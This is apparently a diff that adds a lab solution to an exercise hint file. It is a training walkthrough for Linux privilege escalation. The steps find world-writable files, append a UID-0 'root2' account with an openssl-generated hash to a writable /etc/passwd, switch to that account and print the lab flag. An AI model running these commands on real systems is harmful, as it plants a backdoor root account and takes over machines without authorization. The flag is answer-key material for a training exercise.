@@ -5,3 +5,23 @@ HINT
 Begin by enumerating all world-writable files on the system using the technique in Manual Enumeration - Listing 15.
 Use the techniques taught in Abusing Password Authentication to abuse the write permissions on these files and escalate privileges.
 
+ssh student@192.168.155.52 -p2222
+
+find / -writable -type f 2>/dev/null
+...
+/etc/passwd
+...
+
+# Just notice that we can write the /etc/passwd file
+# Lets create a root2 account
+
+openssl passwd w00t
+nht6bAPDRWmtc
+echo "root2:nht6bAPDRWmtc:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+cat flag.txt
+OS{42b980549ed9689051beef5842f3226e}
+
+
+
+
